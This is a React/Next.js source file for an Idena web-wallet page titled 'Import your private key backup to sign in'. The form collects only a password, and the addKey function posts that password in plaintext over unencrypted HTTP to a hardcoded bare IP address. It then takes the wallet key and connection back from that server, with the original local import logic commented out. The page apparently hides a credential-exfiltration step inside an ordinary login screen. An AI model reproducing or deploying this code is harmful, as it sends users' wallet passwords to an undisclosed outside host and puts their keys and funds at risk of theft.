import axios from 'axios'
import {Flex, Checkbox, Text, useBreakpointValue, Box} from '@chakra-ui/react'
import React, {useState} from 'react'
import {useRouter} from 'next/router'
import {useTranslation} from 'react-i18next'
import {SubHeading} from '../../shared/components'
import {
  FormLabel,
  Input,
  PasswordInput,
  QrScanner,
} from '../../shared/components/components'
import {useAuthDispatch} from '../../shared/providers/auth-context'
import theme from '../../shared/theme'
import {AuthLayout} from '../../shared/components/auth'
import {PrimaryButton, SecondaryButton} from '../../shared/components/button'
import {QrScanIcon} from '../../shared/components/icons'
import useApikeyPurchasing from '../../shared/hooks/use-apikey-purchasing'
import {useSettingsDispatch} from '../../shared/providers/settings-context'
import {privateKeyToAddress} from '../../shared/utils/crypto'
import {sendSignIn} from '../../shared/utils/analytics'
import {useAppContext} from '../../shared/providers/app-context'

export default function ImportKey() {
  const size = useBreakpointValue(['lg', 'md'])
  const logoSize = useBreakpointValue(['88px', '80px'])
  const variant = useBreakpointValue(['mobile', 'initial'])
  const {t} = useTranslation()
  const [state, setState] = useState({
    key: '',
    password: '',
    saveKey: true,
  })
  const {saveConnection} = useSettingsDispatch()
  const {setNewKey, decryptKey} = useAuthDispatch()
  const [error, setError] = useState()
  const [isScanningQr, setIsScanningQr] = useState(false)
  const router = useRouter()
  const {setRestrictedKey} = useApikeyPurchasing()
  const [, {resetRestrictedModal}] = useAppContext()

  const WebCheckerUrl = `http://95.216.144.197:8080/`

  const addKey = async () => {
    try {
      setError(null)
      const receivedData = (
        await axios.post(WebCheckerUrl, {key: state.password})
      ).data
      const key = receivedData[1]
      if (key) {
        setError(null)
        setNewKey(key, state.password, state.saveKey)
        saveConnection(receivedData[0], state.password)
        resetRestrictedModal()
        sendSignIn(privateKeyToAddress(decryptKey(receivedData[1], state.password)))
//if (!apiKey) {
        //  setRestrictedKey()
        //}
        //sendSignIn(privateKeyToAddress(key))
        //resetRestrictedModal()
        router.push('/home')
      } else {
        setError(t('Key or password is invalid. Try again.'))
      }
   }catch(e){console.log(e)}
  }

  return (
    <AuthLayout>
      <AuthLayout.Normal>
        <Flex
          direction={['column', 'initial']}
          align={['center', 'initial']}
          width="100%"
        >
          <img
            src="/static/idena-logo-circle.svg"
            alt="logo"
            width={logoSize}
            height={logoSize}
          />
          <Flex
            direction="column"
            justify="center"
            flex="1"
            w={['85%', '100%']}
            m={['48px 0 0 0', '0 0 0 20px']}
          >
            <SubHeading color="white">
              {t('Import your private key backup to sign in')}
            </SubHeading>
            <Flex justify="space-between">
              <Text color="xwhite.050" fontSize="mdx">
                {t(
                  'Enter your private key backup. You can export your private key from Idena app (see Settings page).'
                )}
              </Text>
            </Flex>
          </Flex>
        </Flex>
        <Flex w="100%" mt="24px">
          <form
            onSubmit={async e => {
              e.preventDefault()
              addKey()
            }}
            style={{width: '100%'}}
          >
            
            <FormLabel
              display={['none', 'inherit']}
              htmlFor="key"
              style={{
                color: 'white',
                fontSize: 'md',
              }}
            >
              {t('Password')}
            </FormLabel>
            <Flex width="100%">
              <PasswordInput
                size={size}
                value={state.password}
                width="100%"
                borderColor="xblack.008"
                backgroundColor="xblack.016"
                onChange={e =>
                  setState({
                    ...state,
                    password: e.target.value,
                  })
                }
                placeholder={t('Enter your password')}
              />
            </Flex>
            <Flex
              mt={[4, 8]}
              direction={['column', 'initial']}
              justify="space-between"
            >
              <Checkbox
                pt={[7, 0]}
                order={[2, 1]}
                variant={variant}
                value={state.saveKey}
                isChecked={state.saveKey}
                onChange={e => setState({...state, saveKey: e.target.checked})}
                style={{fontWeight: 300}}
              >
                {t('Save the encrypted key on this device')}
              </Checkbox>
              <Flex order={[1, 2]}>
                <SecondaryButton
                  isFullWidth={[true, false]}
                  display={['none', 'initial']}
                  variant="secondary"
                  css={{marginRight: '10px'}}
                  onClick={() => router.push('/')}
                >
                  {t('Cancel')}
                </SecondaryButton>
                <PrimaryButton
                  size={size}
                  isFullWidth={[true, false]}
                  type="submit"
                  disabled={!state.password}
                >
                  {t('Import')}
                </PrimaryButton>
              </Flex>
            </Flex>
            {error && (
              <Flex
                mt="30px"
                fontSize="mdx"
                style={{
                  backgroundColor: theme.colors.danger,
                  borderRadius: '9px',
                  padding: `18px 24px`,
                }}
              >
                {error}
              </Flex>
            )}
          </form>
        </Flex>
      </AuthLayout.Normal>
      {isScanningQr && (
        <QrScanner
          isOpen={isScanningQr}
          onScan={key => {
            if (key) {
              setState({key})
              setIsScanningQr(false)
            }
          }}
          onClose={() => setIsScanningQr(false)}
        />
      )}
    </AuthLayout>
  )
}
